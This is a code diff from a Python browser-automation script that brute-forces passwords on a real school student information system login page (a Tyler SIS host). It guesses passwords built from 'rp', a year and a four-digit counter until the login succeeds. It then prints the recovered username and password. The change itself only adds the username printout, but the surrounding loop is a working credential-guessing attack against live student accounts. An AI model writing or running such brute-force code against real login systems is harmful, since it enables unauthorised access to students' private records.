@@ -32,5 +32,6 @@ while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#attempts 
     num = int(num) + 1 #goes to the next password
     time.sleep(1)#delay to allow tyler sis to process the login information submitted
 
-num = int(num) - 2 #the program keeps moving while the interface is loading and typically goes 2 passwords ahead of what the correct password is
-print("The password is:" + "rp" + year + str(num).zfill(4))#prints the correct password for the user inputed
+num = int(num) - 2#the program keeps moving while the interface is loading and typically goes 2 passwords ahead of what the correct password is
+print("The username is: " + username)#prints the username inputed earlier
+print("The password is: " + "rp" + year + str(num).zfill(4))#prints the correct password for the user inputed
